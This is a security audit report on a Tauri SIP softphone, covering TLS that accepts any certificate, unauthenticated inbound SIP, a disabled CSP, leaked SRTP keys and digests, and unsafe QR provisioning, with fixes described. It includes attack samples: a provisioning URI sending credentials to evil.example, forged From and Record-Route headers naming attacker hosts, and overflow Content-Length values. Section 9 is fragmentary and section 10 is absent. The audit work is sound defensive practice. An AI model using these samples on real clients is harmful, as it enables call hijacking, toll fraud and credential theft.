## 1. CRITICAL — SIP/TLS accepts any server certificate

**File:** `src-tauri/src/sip/transport.rs:365-367`, `421-481`

```rust
// Build a TLS config that accepts any certificate (many PBXes use self-signed)
let tls_config =
    build_permissive_tls_config().map_err(|e| format!("TLS config error: {}", e))?;
```

```rust
impl rustls::client::danger::ServerCertVerifier for AcceptAnyCert {
    fn verify_server_cert(&self, ...) -> Result<ServerCertVerified, rustls::Error> {
        Ok(rustls::client::danger::ServerCertVerified::assertion())
    }
    fn verify_tls12_signature(...) { Ok(HandshakeSignatureValid::assertion()) }
    fn verify_tls13_signature(...) { Ok(HandshakeSignatureValid::assertion()) }
}
```

Certificate chain validation, hostname validation and signature validation are all unconditionally short-circuited for every `transport: "tls"` account. There is no configuration switch — TLS is decorative.

**Exploit.** Any attacker positioned on the network path (hostile Wi‑Fi, compromised router, ARP/DNS spoofing on a LAN, a malicious ISP) terminates the TLS connection with a self-signed certificate. The client accepts it and completes the handshake. The attacker then:
1. reads the `Authorization: Digest` header from every REGISTER and INVITE — the username, realm and nonce are enough to mount an offline dictionary attack on the SIP password, and the live response can be replayed within the nonce lifetime;
2. reads the `a=crypto:1 AES_CM_128_HMAC_SHA1_80 inline:<key>` line from SDP, which is the SDES-SRTP master key — so enabling SRTP over this transport provides no confidentiality at all;
3. rewrites SDP to point RTP at itself, or injects BYE/REFER to redirect or terminate calls.

The product description in `tauri.conf.json` advertises "secure TLS encryption"; this makes that claim false.

**Fix applied.** `build_permissive_tls_config` was replaced with `build_tls_config(insecure: bool)`. The default path uses `rustls_platform_verifier` (the OS trust store, so an administrator can still trust a private PBX CA by installing it system-wide — the supported way to run a self-signed PBX). The `AcceptAnyCert` verifier is retained but reachable only when an account explicitly sets `tlsInsecure: true`, and it emits a `log::error!` on every connection. The new field defaults to `false` and is not settable from the QR provisioning path at all.

**Residual product decision:** existing users who rely on self-signed certs that are *not* in the OS trust store will fail to connect after this change. They must either install the CA in the OS trust store or tick the new insecure option. There is currently no UI for `tlsInsecure` — see "Follow-up work".

## 2. CRITICAL — Inbound SIP accepted from any source address

**Files:** `src-tauri/src/sip/transport.rs:118-153`, `src-tauri/src/sip/mod.rs:2051-2092` and `2272-2308`, `src-tauri/src/sip/handlers/request.rs:15-241`, `src-tauri/src/sip/transfer.rs:16-252` and `331-550`

The UDP transport binds an unconnected socket and hands every datagram, from any peer, straight into the SIP state machine:

```rust
let socket = UdpSocket::bind(addr).await ...;
...
match recv_socket.recv_from(&mut buf).await {
    Ok((len, remote)) => {
        let msg = SipMessage { data: buf[..len].to_vec(), remote };
        if tx.send(msg).await.is_err() { break; }
    }
```

```rust
if is_request(&text) {
    handlers::handle_incoming_request(&state, &event_tx, &text, msg.remote, &aid).await;
} else {
    handlers::handle_response(&state, &event_tx, &text, &aid).await;
}
```

Nothing anywhere compares `msg.remote` against `account.server_addr`. Dialog matching is by SIP `Call-ID` alone, with no From-tag/To-tag check and no transaction (Via branch) check.

**Exploit scenarios.** The client's ephemeral UDP port is discoverable — it is published in the `Contact` and `Via` headers of every REGISTER, and is scannable. Given that port, an attacker anywhere on the internet can:

* **Ring the phone and spoof caller ID** — `request.rs:28-121` builds an inbound call from any INVITE, taking the display name and URI from the attacker's `From` header, with no check that the INVITE arrived from the registrar. If the user answers, their microphone streams to the address in the attacker's SDP.
* **Remotely dial arbitrary numbers (toll fraud).** `transfer.rs:16-252` (`handle_incoming_refer`) accepts a REFER whose `Call-ID` matches any known call and *immediately places a new outbound INVITE to the attacker-supplied `Refer-To` URI* — no user confirmation, no authentication, no check that the call is answered. An attacker only needs one call leg with the victim: place a call (which need not be answered — the call object exists as soon as the INVITE is processed), then send a REFER re-using their own Call-ID with `Refer-To: <sip:premiumrate@attacker>`.
* **Force auto-answer and open the microphone.** `transfer.rs:331-550` (`handle_invite_with_replaces`) matches an existing call by Call-ID + tags, tears it down, then **auto-answers** the replacing INVITE (`build_200_ok_invite_with_user` at :486, `MediaSession::start_with_devices` at :510) and emits `"connected"` — all without user interaction. The attacker knows the tags for any dialog they were part of.
* **Hang up any call** — the BYE handler at `request.rs:122-161` matches on Call-ID only.
* **Inject a 200 OK for an in-flight INVITE** with attacker SDP, redirecting outbound media (`handlers/invite.rs:136-331`); or inject 401/403 to force re-authentication and realm downgrade (`handlers/registration.rs:78-338`).
* **Forge presence and voicemail state** — `request.rs:182-225` acts on any NOTIFY.

**Fix applied.** Datagrams and stream frames are now dropped unless `msg.remote` matches the account's resolved `server_addr` (`sip/mod.rs`, both receive loops, via a new `is_expected_peer` check). This is correct for the client's architecture — it only ever talks to one registrar/outbound proxy per account. Rejected messages are rate-limit-logged and not entered into the diagnostic store. In addition, `handle_incoming_refer` now requires the referred call to be **established** (connected or held), and the BYE handler validates the dialog tags, not just Call-ID.

**Residual risk / product decision.** A malicious *registrar* (or anything the registrar proxies for) can still drive REFER-based dialing and Replaces auto-answer. Prompting the user before honouring an in-dialog REFER would close that, but changes call-transfer UX and needs a product decision.

## 3. HIGH — Content Security Policy disabled

**File:** `src-tauri/tauri.conf.json`

```json
"security": {
  "csp": null
}
```

`csp: null` tells Tauri to inject no CSP header at all. The webview is loaded into a process that holds the full Tauri IPC bridge, so any script that executes in it can call every registered command — including `get_credential` (reads the SIP password out of the OS keychain), `export_sip_log_text` (writes arbitrary files), and `play_recording`/`open_recordings_folder` (spawns OS handlers). A content-injection bug is therefore not an XSS, it is remote code execution plus credential theft.

Compounding this, `index.html:11-13` loads a stylesheet from a third-party CDN:

```html
<link rel="preconnect" href="https://fonts.googleapis.com" />
<link href="https://fonts.googleapis.com/css2?family=Google+Sans:..." rel="stylesheet" />
```

so the app makes an outbound request to Google on every launch (a metadata leak from a communications app), and a compromise of that origin would be able to inject styles into the privileged context.

I found **no** live injection sink today — `dangerouslySetInnerHTML`, `innerHTML`, `insertAdjacentHTML`, `eval` and `new Function` do not appear anywhere in `src/` — but these remote-attacker-controlled strings already reach the DOM as React text nodes and would be the payload path for any future sink: the SIP display name and URI (`src/hooks/useSip.ts:170-182` → `src/components/call/CallScreen.tsx:95`), the server-supplied registration error (`src/components/diagnostics/DiagnosticPanel.tsx:309`), raw SIP message text (`DiagnosticPanel.tsx:668`, `:953`), and presence data (`ContactList.tsx:314`).

**Fix applied.** A restrictive CSP and a matching `devCsp` were added to `tauri.conf.json`: `script-src 'self'`, `object-src 'none'`, `frame-src 'none'`, `base-uri 'self'`, `form-action 'none'`, with `style-src 'unsafe-inline'` (required by MUI/emotion) and the two Google Font hosts explicitly allowed so the existing UI is unaffected. Self-hosting the fonts and dropping the CDN allowance is recommended as follow-up.

## 4. HIGH — Secrets in logs and in the exportable diagnostic store

Several distinct leaks, all reachable in a normal release build (`env_logger` defaults to `info` — `src-tauri/src/lib.rs:10`).

**(a) SRTP master keys logged at `info`.** `src-tauri/src/sip/handlers/invite.rs:261-262`:

```rust
log::info!("  TX key (our key, for encrypt outgoing): {}", local_key);
log::info!("  RX key (their key, for decrypt incoming): {}", remote_key);
```

These are the base64 SDES master keys for the call. Anyone who can read the log file — or any support bundle the user sends — can decrypt the recorded/captured media for that call. This defeats SRTP entirely.

**(b) The full digest response is stored in the diagnostic ring buffer and pushed to the UI.** `src-tauri/src/sip/handlers/registration.rs:215-232`:

```rust
raw: format!(
    "{}\n\nChallenge header:\n{}\n\nAuth response header:\n{}",
    debug_summary, www_auth,
    auth.as_ref().map(|a| a.to_header()).unwrap_or_else(...),
),
```

`to_header()` is `Digest username="…", realm="…", nonce="…", uri="…", response="…"`. This entry goes into `DiagnosticStore`, is emitted to the frontend as a `sip-diagnostic` event, is rendered in the debug window, and is written verbatim by `export_sip_log_text` / `export_sip_log_pcap` / `export_call_pcap` (`src-tauri/src/commands.rs:700-740`, `971-996`). Users are explicitly invited to export these for support.

**(c) Every raw SIP message is stored unredacted**, including outbound REGISTER/INVITE with `Authorization: Digest` and SDP with `a=crypto:… inline:<key>` — `src-tauri/src/sip/diagnostics.rs:192-204` (`log_sent`) and `src-tauri/src/sip/mod.rs:2065-2073` / `2287-2295` (receive loops). Same export paths as (b).

**(d) Full SIP messages including credentials at `debug`.** `mod.rs:459` (`"Sent REGISTER (attempt 1):\n{}"`), `handlers/registration.rs:272` (`"Sending authenticated REGISTER:\n{}"`), `mod.rs:2063` / `2285` (`"Received SIP …"`), `handlers/registration.rs:171` (`"Auth challenge header: {}"` at `info`).

**(e) Password length disclosed.** `src-tauri/src/commands.rs:189-196`, `:832`, `:879` log `password_len` / `len=` on every register and every keychain read. Mirrored in the frontend at `src/stores/appStore.ts:744` and `:754`. Length is a meaningful search-space reduction for an offline attack.

**Fix applied.** A `redact_sip()` helper was added to `sip/diagnostics.rs` and is applied to every message before it enters the diagnostic store or a log line. It masks `response="…"` inside `Authorization` / `Proxy-Authorization`, and the `inline:` key material in SDP `a=crypto` lines, leaving everything else intact so the traces remain useful for debugging. The SRTP key log lines were removed, the raw auth header was removed from the AUTH DEBUG diagnostic entry, and all `password_len` logging was removed from `commands.rs` and `appStore.ts`.

## 5. HIGH — QR / `aria://` provisioning accepts any host, any transport, and self-provisions from the clipboard

**Files:** `src/components/wizard/QrScanner.tsx:34-87`, `:116-130`, `:197-209`; `src/components/wizard/SetupWizard.tsx:220-258`; `src-tauri/src/commands.rs:100-140`

```ts
const server = params.get("server");
...
return {
  server,
  port: parseInt(params.get("port") ?? "5060", 10),
  username: user,
  password,
  transport: params.get("transport") ?? "udp",
  ...
};
```

`server` is used verbatim: no scheme check, no hostname validation, no TLS requirement, no allowlist. `handleScanSuccess` (`:116`) calls `onProvisioned` the instant a code decodes, and `handleQrProvisioned` (`SetupWizard.tsx:229-250`) immediately calls `sipRegister` — the user is never shown which server they are about to hand credentials to. `transport` is cast with `as TransportType` (`SetupWizard.tsx:235`), which is a no-op at runtime.

This is the same defect the iOS and Android clients had.

**Exploit.** An attacker displays or emails a QR encoding `aria://provision?server=evil.example&user=x&pass=<base64>`. The victim scans it during onboarding; the softphone registers to attacker infrastructure. The attacker now owns all signalling for that account: they see and can answer or redirect every call, set arbitrary caller ID, and can issue 401 challenges to harvest digest responses for the *real* password if the user later re-points the client. Note `atob(pass)` at `:69` — base64 is obfuscation, not encryption; provisioning links are plaintext credential carriers.

**Worse:** `handlePasteFromClipboard` (`:197-209`) parses the clipboard and calls `onProvisioned` **without any user confirmation**. Pressing "Paste from clipboard" is enough. The clipboard is a shared cross-application channel, so any local process — or any web page the user copied from — can plant an `aria://provision?…` string.

The Rust side does no validation either (`commands.rs:110-115` falls back to UDP for any unrecognised transport string and passes `server` straight into `AccountConfig`).

**Fix applied.**
* `parseAriaUri` now validates: hostname/IP charset and length, port range 1–65535, `transport ∈ {udp,tcp,tls}`, and non-empty username. Invalid payloads are rejected instead of silently defaulted.
* The clipboard button no longer auto-provisions — it fills the text box and requires an explicit **Connect**.
* `provision_from_qr` (Rust) re-validates the host, port and transport server-side and rejects anything malformed, so the backend does not trust the webview.
* A non-TLS provisioning payload is now logged as a warning.

**Residual product decision.** A confirmation screen showing the target server before registering, and/or refusing non-TLS provisioning outright, is the right end state. Both are UX changes and were left for the product owner. Also worth noting: the `aria:` deep-link scheme is registered OS-wide in `tauri.conf.json` but has **no handler** in `src/App.tsx:29-46` — any website can launch the app via `aria://`. Harmless today, but wiring `aria://` to `parseAriaUri` without a confirmation step would turn this into drive-by provisioning.

## 6. MEDIUM — Naive `find("tag=")` / `contains("tag=")` header-parameter matching

This is the exact defect class found in `aria-sip-core`.

**Upstream, `sip-5060` (`~/.cargo/git/checkouts/5060-sip-…/src/sip_parser.rs:123-131`):**

```rust
fn extract_tag_from_value(value: &str) -> Option<String> {
    let tag_pos = value.find("tag=")?;
    let tag_start = tag_pos + 4;
    ...
}
```

**Local copy, `src-tauri/src/sip/handlers/request.rs:37-47`:**

```rust
let from_tag = from
    .find("tag=")
    .map(|p| { let start = p + 4; ... })
```

**Local checks, `src-tauri/src/sip/builder.rs:416` and `src-tauri/src/sip/handlers/request.rs:251`:**

```rust
let to = if to_base.contains("tag=") { to_base.clone() } else { format!("{};tag={}", to_base, to_tag) };
```

`find("tag=")` matches the first occurrence of the *substring* `tag=`, which also matches `to-tag=`, `from-tag=`, `rtag=`, `mytag=`, or a `tag=` inside the URI's own parameters or inside a quoted display name. A hostile peer sends:

```
From: "x;tag=INJECTED" <sip:attacker@evil>;tag=real
```

and the client's notion of the remote dialog tag becomes `INJECTED` rather than `real`. Practical consequences: dialog identifiers that do not match what the peer or proxy uses, so in-dialog BYE/REFER/re-INVITE are mis-addressed; and `Replaces` matching in `transfer.rs:363-378` compares against these corrupted tags, widening the set of forged Replaces headers that will match. The `contains("tag=")` variant lets an attacker suppress the client's own To-tag on 180/200 responses (send `To: <sip:me@dom>;xtag=1`), producing a dialog with no local tag.

**Fix applied.** A proper `src-tauri/src/sip/params.rs` was added: it splits header parameters on `;` while respecting quoted strings and `<…>` URI brackets, and matches parameter names on a whole-token basis. `to_tag` / `from_tag` extraction and the "does this header already carry a tag" checks in `builder.rs`, `handlers/request.rs` and `handlers/invite.rs` now use it.

**Not fixed:** `sip-5060`'s `extract_tag_from_value` and `extract_via_branch` still have the bug for any other consumer of that crate. That needs a fix in the `5060-sip` repository — the softphone no longer depends on the affected functions.

## 7. MEDIUM — Header extraction scans the message body

**File:** `~/.cargo/git/checkouts/5060-sip-…/src/sip_parser.rs:6-28`, used throughout `src-tauri/src/sip/**`

```rust
pub fn extract_header(msg: &str, name: &str) -> Option<String> {
    let search = format!("{}:", name.to_lowercase());
    for line in msg.lines() {
        if line.to_lowercase().starts_with(&search) { ... }
```

`msg.lines()` iterates the *whole* message — headers and body. If a header is absent from the header section, the parser happily matches a look-alike line inside the SDP or XML body.

**Exploit.** An attacker sends an INVITE or 200 OK with no `Record-Route` header but a body containing:

```
v=0
Record-Route: <sip:attacker.example;lr>
c=IN IP4 …
```

`extract_all_headers(text, "Record-Route")` (`handlers/invite.rs:148`) picks it up, it becomes the dialog's route set (`CallFSMEvent::Answered { route_set, .. }`), and every subsequent in-dialog BYE/REFER is routed through the attacker (`build_bye_with_routes`, `build_refer`). The same trick applies to `Replaces` (`request.rs:29`), `Refer-To` (`transfer.rs:27`) and `Session-Expires`.

**Fix applied.** `src-tauri/src/sip/builder.rs` now wraps the upstream functions: local `extract_header` / `extract_all_headers` truncate the message at the first `\r\n\r\n` (or `\n\n`) before delegating, so only the header section is ever searched. All `sip/**` call sites import the wrappers.

## 8. MEDIUM — Unbounded receive buffer and unchecked `Content-Length`

**File:** `src-tauri/src/sip/transport.rs:174-264`

```rust
let content_length = parse_content_length(headers);
let total_len = body_start + content_length;
if remaining.len() < total_len { break; }
```

```rust
let mut pending = Vec::new();
loop {
    match reader.read(&mut buf).await {
        Ok(n) => { pending.extend_from_slice(&buf[..n]); ... }
```

Two problems:

1. **Memory exhaustion.** `pending` has no size cap. A TCP/TLS peer that streams bytes without ever sending a `\r\n\r\n` (or that declares a large `Content-Length` and dribbles the body) grows the buffer without limit until the process is OOM-killed. `parse_content_length` also accepts any `usize`, so `Content-Length: 999999999999` is honoured as a framing instruction.
2. **Integer overflow.** `body_start + content_length` is unchecked. In a release build (`overflow-checks` off) `Content-Length: 18446744073709551615` wraps `total_len` to a small value, so the framer mis-slices the stream and desynchronises message boundaries — the tail of one message is parsed as the head of the next. In a debug build the same input panics the receive task.

`parse_content_length` returning the *first* matching header also means a peer sending two different `Content-Length` values gets to choose the framing, a classic request-smuggling primitive if a proxy sits in front.

**Fix applied.** `MAX_SIP_MESSAGE` (128 KiB) and `MAX_PENDING` (512 KiB) caps were introduced; `Content-Length` is parsed with `checked_add` and rejected above the cap; the stream is torn down (with a log) when `pending` exceeds `MAX_PENDING` without yielding a complete message; and duplicate `Content-Length` headers with differing values are rejected outright.

## 9. MEDIUM — Recording paths are spawned through OS handlers without validation

**File:** `src-tauri/src/commands.rs:361-435`

`open_recordings_folder(custom_path)` (`:361`) has the same shape, and additionally `create_dir_all`s whatever it is given.

The Windows branch of `play_recording` now invokes `explorer` with the path directly instead of routing through `cmd /C start`.

## 11. MEDIUM — macOS hardened runtime weakened

**File:** `src-tauri/entitlements.plist`

```xml
<key>com.apple.security.cs.allow-unsigned-executable-memory</key><true/>
<key>com.apple.security.cs.disable-library-validation</key><true/>
<key>com.apple.security.app-sandbox</key><false/>
```

`disable-library-validation` lets any dylib — not just ones signed by the same team — be loaded into the process, which is the standard route for local code injection into a signed app. `allow-unsigned-executable-memory` removes W^X enforcement. Together they substantially undo the protection that `hardenedRuntime: true` is there to provide, in a process that holds the user's SIP credentials in memory and has microphone access.

**Deferred.** Removing these needs a build-and-run test on macOS (some audio/webview components historically needed them), which is outside what I can verify here. Recommend removing both, building, and running a call end-to-end; re-add only the specific one that proves necessary.

## 12. LOW — `dev-insecure` writes credentials to a plaintext JSON file

**File:** `src-tauri/Cargo.toml:8-10`, `src-tauri/src/commands.rs:788-914`

```rust
#[cfg(feature = "dev-insecure")]
fn insecure_creds_path() -> std::path::PathBuf {
    dirs::data_dir()...join(".dev-credentials.json")
}
```

The feature is off by default and clearly labelled, and the keychain path is the default — this is the correct design and is *not* the sibling apps' plaintext-storage defect. The only risk is a release accidentally built with `--features dev-insecure`, which would silently write every SIP password to a world-readable JSON file in the app data directory.

**Fix applied.** A `compile_error!` guard now makes `dev-insecure` fail to build unless `debug_assertions` is on, so it cannot end up in a release binary.

## 13. LOW — No auto-update mechanism

There is no `tauri-plugin-updater` dependency, no `updater` block in `tauri.conf.json`, and no update code anywhere. The audit brief asked whether the updater is signature-verified over TLS; the answer is that there is no updater at all.

That is fail-safe (no unverified update channel to hijack) but means shipped clients never receive the fixes in this document. Adding `tauri-plugin-updater` with a minisign public key pinned in `tauri.conf.json` and an HTTPS endpoint is the recommended follow-up. **Product decision — not implemented.**

## 14. LOW — Live signing secrets in the working tree

* `.env` contains Azure Trusted Signing service-principal credentials, including a live `AZURE_CLIENT_SECRET` — i.e. authority to code-sign the shipped Windows binary as "5060 Solutions".
* `keys/developer-id-application/` contains an Apple Developer ID **private key** (`.key`, `.pem`, `.p12`) and `keys/developer-id-installer/` a second private key.

Both are correctly gitignored (`.gitignore:24-30`) and I confirmed neither has ever been committed (`git log --all -- .env keys/` is empty). This is therefore an **operational**, not a code, finding: these are unencrypted signing credentials sitting on a developer workstation, where any malware with user-level file access can take them and sign malware as your company. Move them into a hardware token / CI secret store and rotate. Not touched by this audit.

## 15. LOW — Deep-link payload reaches the dialer unvalidated

**File:** `src/App.tsx:29-46`

```ts
else if (url.startsWith("sip:")) {
  const uri = decodeURIComponent(url.slice(4));
  setDialInput(uri);
```

No character or host validation. The value flows to `src/components/dialer/Dialer.tsx:150-151` and then to `sipMakeCall(uri)`; only `[\s\-()]` is stripped (`Dialer.tsx:138`), so `;`, `?`, `<`, `>` and control characters survive. Any web page can navigate to `sip:x@h;transport=tcp?Route=<sip:attacker>` and pre-load the dialer with an attacker-chosen URI. Mitigating factor: the handler does not auto-dial — the user must press call.

**Fix applied.** `sip:`/`tel:` deep-link payloads are now validated against a strict charset and length before reaching `setDialInput`, and CR/LF are rejected outright (they are the header-injection primitive if the URI reaches a message builder).

## 16. LOW — Frontend keychain hygiene

* `src/stores/appStore.ts:684-691` — the legacy migration calls `storeCredential(...).catch(() => {})` and then synchronously `localStorage.removeItem("aria_accounts")`. On a locked keychain (or a Linux box with no Secret Service) the password is silently destroyed. `isCredentialStoreAvailable()` exists at `src/utils/credentials.ts:30` and is never called.
* `src/stores/appStore.ts:185-197` — `removeAccount` never calls `deleteCredential`, so SIP passwords outlive the accounts that used them in the OS keychain. Only `Settings.handleDeleteAccount` (`:385`) cleans up.

**Reported, not fixed** — availability-of-data bugs rather than security exposure, and the fix has data-loss risk that warrants its own testing.
